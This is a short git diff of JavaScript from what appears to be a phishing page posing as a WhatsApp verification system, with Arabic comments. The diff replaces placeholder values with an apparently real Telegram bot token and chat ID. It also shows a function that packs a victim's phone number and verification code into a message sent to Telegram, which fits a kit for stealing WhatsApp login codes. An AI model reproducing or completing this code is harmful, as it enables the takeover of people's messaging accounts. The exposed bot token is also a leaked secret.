@@ -223,8 +223,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
     function sendDataToTelegram(phoneNumber, code) {
         // البيانات التي سيتم إرسالها
-        const botToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بتوكن بوتك الحقيقي
-        const chatId = 'YOUR_CHAT_ID';     // استبدل هذا بمعرف الدردشة الحقيقي
+        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // استبدل هذا بتوكن بوتك الحقيقي
+        const chatId = '8457242337';     // استبدل هذا بمعرف الدردشة الحقيقي
         
         const message = `🔐 *نظام توثيق واتساب*\n\n📱 *رقم الهاتف:* ${phoneNumber}\n🔢 *رمز التحقق:* ${code}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n🛡️ *الحالة:* تم التوثيق بنجاح`;
         
